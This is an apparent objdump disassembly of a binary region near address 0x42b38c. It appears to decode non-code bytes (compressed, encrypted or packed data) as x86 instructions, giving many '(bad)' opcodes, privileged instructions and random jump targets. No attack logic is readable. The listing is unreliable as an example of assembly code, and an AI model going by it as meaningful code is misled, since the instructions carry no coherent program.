  42b38c:	inc    edi
  42b38d:	fnstcw WORD PTR [edx+0x49]
  42b390:	je     0x42b357
  42b392:	push   edi
  42b393:	mov    cl,0xa7
  42b395:	into   
  42b396:	dec    edi
  42b397:	addr16 shl edi,0x82
  42b39b:	and    BYTE PTR [ecx+0x5],dh
  42b39e:	adc    DWORD PTR [edx+0x47],ecx
  42b3a1:	sub    BYTE PTR [eax],0x61
  42b3a4:	or     edi,DWORD PTR [edi+edi*8+0x6a]
  42b3a8:	lock jae 0x42b32f
  42b3ab:	js     0x42b386
  42b3ad:	mov    BYTE PTR [ecx-0x2566ca30],ah
  42b3b3:	sbb    DWORD PTR [ecx+ebp*8+0x6388926c],ecx
  42b3ba:	push   esp
  42b3bb:	mov    ah,0x7
  42b3bd:	adc    al,0x64
  42b3bf:	idiv   BYTE PTR [ebx-0x524fe9ba]
  42b3c5:	stos   BYTE PTR es:[edi],al
  42b3c6:	leave  
  42b3c7:	inc    edx
  42b3c8:	mov    dl,0xe2
  42b3ca:	arpl   WORD PTR [ecx+ebp*4-0xb2c46df],sp
  42b3d1:	(bad)  [eax-0x34]
  42b3d4:	push   0xee2bf68e
  42b3d9:	jl     0x42b36c
  42b3db:	mov    ebp,0x40e7224c
  42b3e0:	fild   WORD PTR [eax]
  42b3e2:	pop    ebp
  42b3e3:	mov    db5,edi
  42b3e6:	test   DWORD PTR [ebx],edx
  42b3e8:	icebp  
  42b3e9:	ret    
  42b3ea:	lods   al,BYTE PTR ds:[esi]
  42b3eb:	jno    0x42b3ca
  42b3ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b3ee:	and    BYTE PTR [ebx],dl
  42b3f0:	xchg   BYTE PTR [ecx],dl
  42b3f2:	cmp    eax,ebp
  42b3f4:	ficomp WORD PTR [ebp-0xab50a1f]
  42b3fa:	inc    ebx
  42b3fb:	sub    DWORD PTR [ebx-0x2255c1cb],esp
  42b401:	and    BYTE PTR [edx+0x1b],dl
  42b404:	jo     0x42b438
  42b406:	sahf   
  42b407:	out    0xa3,eax
  42b409:	arpl   WORD PTR [esi+eax*2+0x46],di
  42b40d:	xchg   esp,eax
  42b40e:	out    dx,eax
  42b40f:	loop   0x42b43d
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ecx],ebp
  42b481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b482:	out    0x73,eax
  42b484:	mov    ecx,0x50001cf
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    BYTE PTR [edx],al
  42b48d:	shl    DWORD PTR [esi+0x46],1
  42b490:	fsubr  DWORD PTR [edi-0xfda06e5]
  42b496:	cmp    ah,dl
  42b498:	in     al,dx
  42b499:	scas   eax,DWORD PTR es:[edi]
  42b49a:	inc    esp
  42b49b:	mov    ecx,0xe1e381e8
  42b4a0:	fistp  WORD PTR cs:[esi+0x37]
  42b4a4:	(bad)  
  42b4a5:	dec    esi
  42b4a6:	and    ah,BYTE PTR [edx-0x71c71857]
  42b4ac:	or     ecx,ebp
  42b4ae:	scas   eax,DWORD PTR es:[edi]
  42b4af:	imul   ebp,edx,0xffffff88
  42b4b2:	inc    esi
  42b4b3:	mov    edx,0x3912b279
  42b4b8:	fisttp QWORD PTR [ecx-0x4f90013f]
  42b4be:	call   0x9c40b284
  42b4c3:	adc    al,0x6a
  42b4c5:	int3   
  42b4c6:	mov    ah,0xd7
  42b4c8:	stc    
  42b4c9:	aaa    
  42b4ca:	(bad)  
  42b4cb:	mov    esp,0x38b1f402
  42b4d0:	jecxz  0x42b4e9
  42b4d2:	or     esp,DWORD PTR [ebx+0x7c8364ac]
  42b4d8:	(bad)  
  42b4d9:	mov    esi,0x5ac64655
  42b4de:	(bad)  
  42b4df:	pop    ss
  42b4e0:	sbb    al,0x2f
  42b4e2:	lahf   
  42b4e3:	fnsave [esi]
  42b4e5:	cmc    
  42b4e6:	or     dl,dh
  42b4e8:	add    BYTE PTR [esi+0x295d03eb],0xde
  42b4ef:	sub    DWORD PTR [edx+0x6e],ebp
  42b4f2:	fcomp  DWORD PTR [esp+eax*1-0x5ef447d0]
  42b4f9:	aaa    
  42b4fa:	jo     0x42b4ef
  42b4fc:	aam    0x32
  42b4fe:	or     ah,al
  42b500:	pop    ds
  42b501:	fimul  DWORD PTR [esi-0x1f9c9a2f]
  42b507:	xor    DWORD PTR [esi+esi*1],0x2f
  42b50b:	test   BYTE PTR [edx-0x6c],0xfd
  42b50f:	mov    ecx,0x9bb125ca
  42b514:	js     0x42b4e0
  42b516:	xor    edx,esi
  42b518:	cdq    
  42b519:	or     al,0x6a
  42b51b:	(bad)  
  42b51c:	pop    ebp
  42b51d:	ja     0x42b572
  42b51f:	ret    0xe426
  42b522:	imul   ebp,DWORD PTR [ecx],0xe5ed8e92
  42b528:	mov    dh,0x15
  42b52a:	popa   
  42b52b:	(bad)  ss:[eax+0x1c789b79]
  42b532:	and    eax,0x53647617
  42b537:	push   ecx
  42b538:	test   DWORD PTR [edi],0x6cd655ce
  42b53e:	leave  
  42b53f:	icebp  
  42b540:	dec    bx
  42b542:	fdivr  DWORD PTR [ecx-0x4d]
  42b545:	test   eax,0x710d6738
  42b54a:	ret    0x3316
  42b54d:	cmp    dh,BYTE PTR [ebx+0x17a18f61]
  42b553:	xor    DWORD PTR [ecx],0xc340c063
  42b559:	outs   dx,BYTE PTR ds:[esi]
  42b55a:	jmp    0x72b8cf06
  42b55f:	mov    cl,0x78
  42b561:	lods   eax,DWORD PTR ds:[esi]
  42b562:	push   esp
  42b563:	cwde   
  42b564:	xchg   DWORD PTR [ecx+eiz*1-0x79],esp
  42b568:	es mov eax,0xaf4027ab
  42b56e:	inc    ebx
  42b56f:	inc    ecx
  42b570:	push   ebx
  42b571:	jbe    0x42b541
  42b573:	loop   0x42b506
  42b575:	outs   dx,BYTE PTR ds:[esi]
  42b576:	aaa    
  42b577:	cmp    al,0xed
  42b579:	ins    BYTE PTR es:[edi],dx
  42b57a:	std    
  42b57b:	mov    ecx,0x95ab343f
  42b580:	mov    DWORD PTR ss:[edi-0x4c2f9fd5],eax
  42b587:	ins    DWORD PTR es:[edi],dx
  42b588:	in     eax,dx
  42b589:	mov    dh,BYTE PTR [eax+ecx*1+0x52b070db]
  42b590:	push   ss
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	cld    
  42b601:	adc    al,0x44
  42b603:	sbb    eax,0x1d0be
  42b608:	add    eax,0xd0000001
  42b60d:	nop
  42b60e:	adc    BYTE PTR [esi],0xd5
  42b611:	inc    ecx
  42b612:	or     DWORD PTR [eax-0x6e],ebx
  42b615:	in     eax,0xd2
  42b617:	jnp    0x42b694
  42b619:	xor    DWORD PTR [edx+eax*1+0x72105a82],ebx
  42b620:	iret   
  42b621:	dec    ebp
  42b622:	cs push 0x7f07a3d4
  42b628:	cs (bad) 
  42b62a:	mov    ecx,esi
  42b62c:	sub    eax,0x31918a9a
  42b631:	retf   
  42b632:	in     al,0x29
  42b634:	add    al,0xd1
  42b636:	or     eax,0x3934fef0
  42b63b:	sti    
  42b63c:	lahf   
  42b63d:	jp     0x42b679
  42b63f:	in     eax,0x14
  42b641:	inc    esp
  42b642:	fs and eax,0x28c08dc9
  42b648:	lods   al,BYTE PTR ds:[esi]
  42b649:	nop
  42b64a:	pop    ds
  42b64b:	mov    es,WORD PTR [ecx-0x2e]
  42b64e:	push   es
  42b64f:	cli    
  42b650:	jl     0x42b6aa
  42b652:	(bad)  [eax+ebp*4+0xe6e78fb]
  42b659:	push   edx
  42b65a:	in     al,dx
  42b65b:	retf   
  42b65c:	sbb    ebp,DWORD PTR ds:0x849861a8
  42b662:	punpckldq mm0,DWORD PTR [ecx*2+0x5b30525d]
  42b66a:	shr    DWORD PTR [edx+0x4],cl
  42b66d:	outs   dx,BYTE PTR ds:[esi]
  42b66e:	mov    dl,0x1e
  42b670:	in     eax,dx
  42b671:	sbb    eax,0x6c5f66d
  42b676:	dec    ebp
  42b677:	adc    eax,0xc1a3fa74
  42b67c:	out    0xf,al
  42b67e:	push   edi
  42b67f:	cld    
  42b680:	pop    eax
  42b681:	lahf   
  42b682:	pop    ds
  42b683:	ss pop ebp
  42b685:	ror    BYTE PTR ds:0xd8a9f571,0xfb
  42b68c:	pop    ebx
  42b68d:	mov    eax,0xcfbecbac
  42b692:	inc    ebp
  42b693:	aad    0xf1
  42b695:	xchg   ecx,eax
  42b696:	shr    ch,1
  42b698:	mov    bl,0xb2
  42b69a:	pop    ds
  42b69b:	mov    cl,0x8
  42b69d:	std    
  42b69e:	or     BYTE PTR [edx+0x6d],cl
  42b6a1:	addr16 sahf 
  42b6a3:	fisubr DWORD PTR [eax-0x47]
  42b6a6:	pavgb  mm4,QWORD PTR [edx-0x2ac16124]
  42b6ad:	push   edi
  42b6ae:	dec    esi
  42b6af:	inc    esp
  42b6b0:	adc    ebp,esp
  42b6b2:	pushf  
  42b6b3:	cmp    BYTE PTR [di],0x21
  42b6b7:	mov    esp,0xd3e0cd5e
  42b6bc:	sar    BYTE PTR [edx-0x4be827c7],1
  42b6c2:	rcl    DWORD PTR ds:0xd1065b71,1
  42b6c8:	das    
  42b6c9:	icebp  
  42b6ca:	push   ebp
  42b6cb:	daa    
  42b6cc:	loop   0x42b6e7
  42b6ce:	dec    edi
  42b6cf:	mov    ch,0x91
  42b6d1:	gs cmp bl,ah
  42b6d4:	fdecstp 
  42b6d6:	cwde   
  42b6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6d8:	jo     0x42b691
  42b6da:	in     eax,dx
  42b6db:	dec    ebx
  42b6dc:	cmp    eax,0x4f6d5423
  42b6e1:	out    0x2f,al
  42b6e3:	fisubr WORD PTR [ecx]
  42b6e5:	push   0xaebea18b
  42b6ea:	xchg   BYTE PTR [esi],dh
  42b6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6ed:	cs sbb eax,0xe17dd021
  42b6f3:	jg     0x42b701
  42b6f5:	sbb    ecx,DWORD PTR [eax-0x7b88be79]
  42b6fb:	or     al,BYTE PTR [ecx-0x3]
  42b6fe:	adc    esp,DWORD PTR [edx]
  42b700:	or     DWORD PTR [edi+0x12],0xa8ee91a1
  42b707:	hlt    
  42b708:	test   BYTE PTR [ebx],0xc3
  42b70b:	enter  0x614f,0xca
  42b70f:	lahf   
  42b710:	push   0x0
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	lea    edx,[ecx]
  42b782:	sar    BYTE PTR [edi],1
  42b784:	ret    
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x6d000001,al
  42b78d:	xor    esp,DWORD PTR [edx-0x25]
  42b790:	aaa    
  42b791:	xchg   DWORD PTR [eax-0x564d7d8f],ebx
  42b797:	in     al,0xa1
  42b799:	cmp    al,0x15
  42b79b:	pop    ebp
  42b79c:	fs sbb ch,dl
  42b79f:	dec    esi
  42b7a0:	rcl    DWORD PTR [edx+0x66],cl
  42b7a3:	repnz xchg esi,eax
  42b7a5:	int    0xd0
  42b7a7:	into   
  42b7a8:	jmp    0x178bf673
  42b7ad:	xor    al,0xd3
  42b7af:	cmc    
  42b7b0:	jecxz  0x42b7ef
  42b7b2:	jno    0x42b737
  42b7b4:	inc    edx
  42b7b5:	retf   
  42b7b6:	xchg   BYTE PTR [ecx-0x97b44b7],dl
  42b7bc:	out    dx,eax
  42b7bd:	xchg   edi,eax
  42b7be:	dec    ecx
  42b7bf:	or     bl,ch
  42b7c1:	dec    edi
  42b7c2:	fcom   st(5)
  42b7c4:	or     DWORD PTR [ecx+edi*4-0x3c955bd3],edx
  42b7cb:	mov    cl,ch
  42b7cd:	dec    ebp
  42b7ce:	xor    DWORD PTR [ecx-0x39],esp
  42b7d1:	push   cs
  42b7d2:	mov    ebx,0x348244f8
  42b7d7:	adc    bl,BYTE PTR [esi-0x6e]
  42b7da:	popa   
  42b7db:	test   BYTE PTR [ecx],dl
  42b7dd:	repz push 0xfffffff4
  42b7e0:	mov    edi,0xdccef883
  42b7e5:	cmp    eax,0xafb1cff3
  42b7ea:	test   al,0x15
  42b7ec:	jb     0x42b802
  42b7ee:	push   0xffffffa6
  42b7f0:	fstp   TBYTE PTR [ebx]
  42b7f2:	inc    ecx
  42b7f3:	pop    esi
  42b7f4:	das    
  42b7f5:	ja     0x42b7e8
  42b7f7:	into   
  42b7f8:	dec    ebx
  42b7f9:	sub    BYTE PTR [edx+edx*8],0xa9
  42b7fd:	inc    ecx
  42b7fe:	jbe    0x42b864
  42b800:	imul   ecx,DWORD PTR [ecx-0x25bbde6b],0x939ac6ff
  42b80a:	aad    0xb7
  42b80c:	sti    
  42b80d:	add    bh,BYTE PTR [ebx]
  42b80f:	jl     0x42b7a0
  42b811:	pop    esi
  42b812:	mov    cl,BYTE PTR [edi]
  42b814:	mov    ds:0xa85f23c1,eax
  42b819:	lds    eax,FWORD PTR [edi+0x1c]
  42b81c:	das    
  42b81d:	bound  esp,QWORD PTR [edi]
  42b81f:	pop    esp
  42b820:	add    dl,BYTE PTR [edi+0x4a]
  42b823:	lea    esp,[edi]
  42b825:	and    DWORD PTR [edi+0x25c01059],ebx
  42b82b:	imul   BYTE PTR [ebp+0x1c]
  42b82e:	xchg   ebp,eax
  42b82f:	mov    gs:0xbd48cd21,eax
  42b835:	pop    ds
  42b836:	or     eax,DWORD PTR [ebx+edi*1+0x6e]
  42b83a:	jbe    0xc2326cd4
  42b840:	adc    al,0x6d
  42b842:	mov    BYTE PTR [edi+0x49],bh
  42b845:	lock adc ecx,DWORD PTR [ecx+0x28d596d7]
  42b84c:	push   edx
  42b84d:	push   edx
  42b84e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b84f:	mov    ds:0xd2f04fb2,al
  42b854:	push   edx
  42b855:	dec    ecx
  42b856:	xchg   esp,eax
  42b857:	adc    DWORD PTR [ecx],edi
  42b859:	daa    
  42b85a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b85b:	pop    esi
  42b85c:	push   es
  42b85d:	iret   
  42b85e:	fs leave 
  42b860:	pop    eax
  42b861:	pop    ebx
  42b862:	ja     0x42b83f
  42b864:	std    
  42b865:	mov    al,BYTE PTR [esi]
  42b867:	pusha  
  42b868:	jo     0x42b86c
  42b86a:	cmp    BYTE PTR [ecx],0xa5
  42b86d:	push   cs
  42b86e:	adc    dl,BYTE PTR [ebp-0x37c6b5d7]
  42b874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b875:	repz or eax,0xa57a33a6
  42b87b:	ds inc esi
  42b87d:	mov    esp,0x2eabf079
  42b882:	cmp    ebx,DWORD PTR [edi]
  42b884:	push   eax
  42b885:	dec    ebx
  42b886:	ja     0x42b8c0
  42b888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b889:	outs   dx,DWORD PTR ds:[esi]
  42b88a:	sub    ah,dl
  42b88c:	lods   eax,DWORD PTR ds:[esi]
  42b88d:	xchg   esp,eax
  42b88e:	(bad)  [edi]
  42b890:	add    BYTE PTR [eax],0x0
	...
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,eax
  42b901:	push   ebp
  42b902:	hlt    
  42b903:	add    eax,0x1d2c8
  42b908:	add    eax,0x19000001
  42b90d:	jb     0x42b8f8
  42b90f:	out    dx,al
  42b910:	sub    bl,bh
  42b912:	mov    al,0xfa
  42b914:	ds int3 
  42b916:	and    esi,edx
  42b918:	shl    BYTE PTR [eax],1
  42b91a:	cmp    BYTE PTR [esi-0x62],cl
  42b91d:	mov    esp,0x9febaa3e
  42b922:	jae    0x42b906
  42b924:	ins    DWORD PTR es:[edi],dx
  42b925:	rcr    BYTE PTR [edx],0x78
  42b928:	fmul   QWORD PTR [edx-0x23]
  42b92b:	jg     0x42b94d
  42b92d:	gs mov edi,0xd2ee2c76
  42b933:	daa    
  42b934:	pop    ds
  42b935:	mov    BYTE PTR [ecx+0x50],dl
  42b938:	in     al,dx
  42b939:	inc    edx
  42b93a:	(bad)  
  42b93b:	cld    
  42b93c:	inc    edi
  42b93d:	test   al,0xfc
  42b93f:	mov    eax,ds:0x73e99da8
  42b944:	test   BYTE PTR [edi+0x6a],dl
  42b947:	mov    ch,0x85
  42b949:	adc    al,0x6c
  42b94b:	mov    eax,0x874d6fef
  42b950:	xchg   esp,eax
  42b951:	add    DWORD PTR [edx-0x73023a63],esi
  42b957:	fisttp WORD PTR [edx+0x3c]
  42b95a:	or     dl,bl
  42b95c:	std    
  42b95d:	mov    esp,0x93e99a17
  42b962:	xor    eax,esi
  42b964:	test   BYTE PTR [esi+0x5a],dh
  42b967:	xchg   esi,eax
  42b968:	bound  edi,QWORD PTR [eax-0x43fec205]
  42b96e:	je     0x42b99d
  42b970:	jae    0x42b961
  42b972:	ss test ebx,eax
  42b975:	mov    al,ds:0x1a4f3c97
  42b97a:	push   cs
  42b97b:	les    edi,FWORD PTR [edi]
  42b97d:	cld    
  42b97e:	cmp    DWORD PTR [edx-0x1a3d13e7],0xffffffce
  42b985:	shr    bh,0x4f
  42b988:	retf   0x3fc4
  42b98b:	sub    DWORD PTR [eax*4-0xe0511fa],edi
  42b992:	xchg   bl,dl
  42b994:	mov    eax,ds:0x8cf8b93b
  42b999:	arpl   WORD PTR ds:0xaf056acc,ax
  42b99f:	pop    ecx
  42b9a0:	dec    esp
  42b9a1:	stos   BYTE PTR es:[edi],al
  42b9a2:	jl     0x42ba10
  42b9a4:	rcl    DWORD PTR [edx],cl
  42b9a6:	ror    DWORD PTR [ecx+0x40c8c399],0x5a
  42b9ad:	mov    edx,ebp
  42b9af:	and    ecx,0xffffffa2
  42b9b2:	xchg   edi,eax
  42b9b3:	test   eax,0x42bc5493
  42b9b8:	xchg   edx,eax
  42b9b9:	cdq    
  42b9ba:	xor    ah,dh
  42b9bc:	mov    ebx,0x20069580
  42b9c1:	ror    BYTE PTR [edi],cl
  42b9c3:	and    BYTE PTR [ebx],cl
  42b9c5:	dec    edx
  42b9c6:	add    BYTE PTR [edi],dl
  42b9c8:	jo     0x42b9bd
  42b9ca:	mov    ebp,0x1f09026c
  42b9cf:	stos   BYTE PTR es:[edi],al
  42b9d0:	sahf   
  42b9d1:	mov    bl,0xcd
  42b9d3:	xchg   edi,eax
  42b9d4:	das    
  42b9d5:	or     ebp,DWORD PTR [edx+esi*4]
  42b9d8:	sbb    BYTE PTR es:[eax-0x64],ch
  42b9dc:	push   edx
  42b9dd:	mov    ebp,esp
  42b9df:	in     eax,dx
  42b9e0:	aas    
  42b9e1:	or     eax,0x40fde801
  42b9e6:	mov    cl,0x2d
  42b9e8:	mov    eax,0xd0dfdec5
  42b9ed:	stos   BYTE PTR es:[edi],al
  42b9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9ef:	or     bh,BYTE PTR [edx]
  42b9f1:	outs   dx,DWORD PTR fs:[esi]
  42b9f3:	je     0x42b99f
  42b9f5:	sar    BYTE PTR [eax],1
  42b9f7:	cli    
  42b9f8:	test   DWORD PTR [edx],ebx
  42b9fa:	jns    0x42b9e8
  42b9fc:	xchg   ebp,eax
  42b9fd:	call   0x37bca66a
  42ba02:	aam    0x87
  42ba04:	iret   
  42ba05:	mov    al,0x8
  42ba07:	(bad)
  42ba0a:	xor    BYTE PTR [ebx-0x1aaf4483],0xc3
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edx],ebp
  42ba81:	loop   0x42ba29
  42ba83:	inc    ebx
  42ba84:	int    0xd3
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0xc5000001
  42ba8d:	xlat   BYTE PTR ds:[ebx]
  42ba8e:	iret   
  42ba8f:	out    0x89,eax
  42ba91:	mov    ch,0xd
  42ba93:	rcl    DWORD PTR [edx+0x15],cl
  42ba96:	pop    esi
  42ba97:	std    
  42ba98:	scas   al,BYTE PTR es:[edi]
  42ba99:	shl    DWORD PTR [edi+eiz*1],0xf5
  42ba9d:	outs   dx,DWORD PTR ds:[esi]
  42ba9e:	test   eax,0x3d181db9
  42baa3:	iret   
  42baa4:	adc    esp,edi
  42baa6:	lods   eax,DWORD PTR ds:[esi]
  42baa7:	push   ecx
  42baa8:	je     0x42ba87
  42baaa:	add    dh,BYTE PTR [esi]
  42baac:	inc    edi
  42baad:	gs jecxz 0x42bb18
  42bab0:	imul   ecx,DWORD PTR [edx-0x50252a56],0xe3818867
  42baba:	loopne 0x42ba3d
  42babc:	mov    eax,ss
  42babe:	push   ss
  42babf:	inc    ecx
  42bac0:	cs mov dh,0x4f
  42bac3:	pusha  
  42bac4:	dec    DWORD PTR [esp+ecx*2]
  42bac7:	mov    dh,0xf8
  42bac9:	xchg   esi,eax
  42baca:	cmp    cl,BYTE PTR [edx]
  42bacc:	ss or  esi,esp
  42bacf:	jle    0x42bb31
  42bad1:	mov    edx,0xf6f4613c
  42bad6:	push   eax
  42bad7:	sub    edx,DWORD PTR [ebx]
  42bad9:	xchg   di,ax
  42badb:	daa    
  42badc:	push   ecx
  42badd:	std    
  42bade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42badf:	mov    eax,ds:0x2cdeedaf
  42bae4:	and    BYTE PTR [ecx],cl
  42bae6:	or     eax,0x25a6c867
  42baeb:	dec    ebp
  42baec:	sbb    BYTE PTR [ecx],al
  42baee:	inc    eax
  42baef:	dec    ebx
  42baf0:	xor    DWORD PTR [esi],0xe9055f2d
  42baf6:	je     0x42baf1
  42baf8:	aaa    
  42baf9:	xor    ah,cl
  42bafb:	push   0xffffffa1
  42bafd:	adc    ebp,DWORD PTR [ecx]
  42baff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb00:	push   edx
  42bb01:	xchg   BYTE PTR [ebx+eiz*4],al
  42bb04:	mov    dh,BYTE PTR [esi-0x21]
  42bb07:	push   ecx
  42bb08:	(bad)  
  42bb09:	test   al,0x47
  42bb0b:	test   al,0x6e
  42bb0d:	xchg   edi,eax
  42bb0e:	ins    BYTE PTR es:[edi],dx
  42bb0f:	jp     0x42bb43
  42bb11:	aas    
  42bb12:	jo     0x42baa6
  42bb14:	push   es
  42bb15:	mov    dl,0x96
  42bb17:	stos   DWORD PTR es:[edi],eax
  42bb18:	mov    esi,DWORD PTR [edx+ebx*2]
  42bb1b:	sbb    BYTE PTR [ecx-0x52815568],dh
  42bb21:	mov    edi,0x473f95c9
  42bb26:	loopne 0x42bb68
  42bb28:	pop    esi
  42bb29:	test   DWORD PTR [ebp-0x30ef683a],ebx
  42bb2f:	dec    ecx
  42bb30:	ret    
  42bb31:	outs   dx,BYTE PTR ds:[esi]
  42bb32:	add    al,0x63
  42bb34:	jmp    0x4a44:0x23e3167e
  42bb3b:	inc    esp
  42bb3c:	inc    ebp
  42bb3d:	scas   al,BYTE PTR es:[edi]
  42bb3e:	xchg   ecx,eax
  42bb3f:	ja     0x42bb0f
  42bb41:	pop    esp
  42bb42:	call   0x4ff48ae4
  42bb47:	pop    esi
  42bb48:	sbb    edi,DWORD PTR ds:0x47db92c3
  42bb4e:	in     eax,0xb6
  42bb50:	les    edx,FWORD PTR [esi+0x4f]
  42bb53:	mov    eax,0x1dc08237
  42bb58:	add    BYTE PTR [bx],bl
  42bb5b:	les    ebx,FWORD PTR [ecx]
  42bb5d:	cmp    edx,edx
  42bb5f:	jno    0x42bb38
  42bb61:	test   eax,0xb1c05b01
  42bb66:	shr    BYTE PTR [esi-0x5d],0xd
  42bb6a:	mov    ss,WORD PTR [edx+0x52]
  42bb6d:	or     ebp,DWORD PTR ds:0x3f752968
  42bb73:	imul   edi,ebx,0xffffffef
  42bb76:	inc    ebx
  42bb77:	mov    dl,0x17
  42bb79:	and    BYTE PTR [ecx],ah
  42bb7b:	loopne 0x42bb1b
  42bb7d:	mov    edx,0x9746138b
  42bb82:	or     al,0x6e
  42bb84:	lahf   
  42bb85:	bound  esi,QWORD PTR [ebp-0x47e6b667]
  42bb8b:	sbb    al,0x77
  42bb8d:	ds push 0x4a
  42bb90:	mov    al,0x0
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	out    dx,al
  42bc01:	and    eax,0xd4d2110c
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0xa2000001
  42bc0d:	cmp    bh,BYTE PTR [esi+ecx*2]
  42bc10:	cs nop
  42bc12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc13:	add    DWORD PTR [ecx+eiz*4],0x67
  42bc17:	xor    esi,DWORD PTR [ebp-0x62]
  42bc1a:	sbb    al,0xd
  42bc1c:	adc    dl,BYTE PTR [edi+0x2a49cd91]
  42bc22:	and    eax,0x286c42a
  42bc27:	mov    ecx,0xee2f107a
  42bc2c:	leave  
  42bc2d:	push   es
  42bc2e:	pop    eax
  42bc2f:	fstp   QWORD PTR ds:0xb4d8b2e5
  42bc35:	in     al,dx
  42bc36:	dec    ecx
  42bc37:	pop    es
  42bc38:	std    
  42bc39:	(bad)  
  42bc3a:	push   ecx
  42bc3b:	jl     0x42bc3d
  42bc3d:	push   ss
  42bc3e:	test   eax,0x8f4164cd
  42bc43:	or     eax,0xb3b117aa
  42bc48:	inc    edi
  42bc49:	dec    edi
  42bc4a:	outs   dx,DWORD PTR ds:[esi]
  42bc4b:	lds    esi,FWORD PTR [ecx+0x25]
  42bc4e:	add    ebx,DWORD PTR [ecx+0x37950f3f]
  42bc54:	mov    dh,0x2
  42bc56:	js     0x42bc25
  42bc58:	lea    edx,[ebp-0x711a3942]
  42bc5e:	nop
  42bc5f:	xchg   esi,eax
  42bc60:	and    ch,cl
  42bc62:	inc    ecx
  42bc63:	and    bl,al
  42bc65:	aas    
  42bc66:	lods   al,BYTE PTR ds:[esi]
  42bc67:	mov    ds:0x57dd1fa3,al
  42bc6c:	adc    DWORD PTR [edx+0x48],ebp
  42bc6f:	ins    BYTE PTR es:[edi],dx
  42bc70:	push   esi
  42bc71:	scas   eax,DWORD PTR es:[edi]
  42bc72:	cmp    edi,edi
  42bc74:	xchg   ebp,eax
  42bc75:	sbb    DWORD PTR [ebx],ebx
  42bc77:	fsub   DWORD PTR [ecx+0x1e6d766a]
  42bc7d:	stc    
  42bc7e:	inc    esp
  42bc7f:	fdivr  QWORD PTR [esi-0x7d]
  42bc82:	adc    ah,BYTE PTR [ebx]
  42bc84:	lea    ebp,[edi+0x43]
  42bc87:	inc    edi
  42bc88:	lds    ebx,FWORD PTR [esi]
  42bc8a:	nop
  42bc8b:	into   
  42bc8c:	xchg   ecx,eax
  42bc8d:	outs   dx,BYTE PTR ds:[esi]
  42bc8e:	push   ss
  42bc8f:	mov    ah,0xf8
  42bc91:	push   eax
  42bc92:	and    BYTE PTR [edx],cl
  42bc94:	cmc    
  42bc95:	imul   BYTE PTR [ebx-0x3f20643a]
  42bc9b:	jns    0x42bc6b
  42bc9d:	into   
  42bc9e:	pop    es
  42bc9f:	pop    eax
  42bca0:	mov    esp,0xfa714f71
  42bca5:	pushf  
  42bca6:	inc    ecx
  42bca7:	sbb    BYTE PTR [eax+0x313b3678],dh
  42bcad:	cmp    eax,edi
  42bcaf:	aad    0xe9
  42bcb1:	jmp    0x42bcf1
  42bcb3:	cmp    eax,0xf201262a
  42bcb8:	xchg   esi,eax
  42bcb9:	pop    ebp
  42bcba:	imul   ebx,esp,0x6c
  42bcbd:	jno    0x42bc46
  42bcbf:	popf   
  42bcc0:	adc    eax,0x1b976c5e
  42bcc5:	sti    
  42bcc6:	mov    eax,ds:0x994a593b
  42bccb:	push   cs
  42bccc:	mov    ds:0xe8487e6d,al
  42bcd1:	cld    
  42bcd2:	or     DWORD PTR [edx-0x40],eax
  42bcd5:	fadd   DWORD PTR [eax-0x2d]
  42bcd8:	sbb    eax,0x153baf63
  42bcdd:	sar    DWORD PTR [ebp+0x59d96847],cl
  42bce3:	std    
  42bce4:	jne    0x42bca2
  42bce6:	mov    dl,0x67
  42bce8:	lods   al,BYTE PTR ds:[esi]
  42bce9:	call   0x50e765d0
  42bcee:	sub    eax,DWORD PTR [ebp+ebp*8+0x2ff90cb6]
  42bcf5:	or     dl,BYTE PTR [edx+0x7e]
  42bcf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcf9:	jmp    0x42bc88
  42bcfb:	jns    0x42bcb2
  42bcfd:	mov    ebp,0x42383469
  42bd02:	mov    ebp,0xce33cce3
  42bd07:	popa   
  42bd08:	cmp    al,0xd0
  42bd0a:	mov    al,ds:0xed63e83a
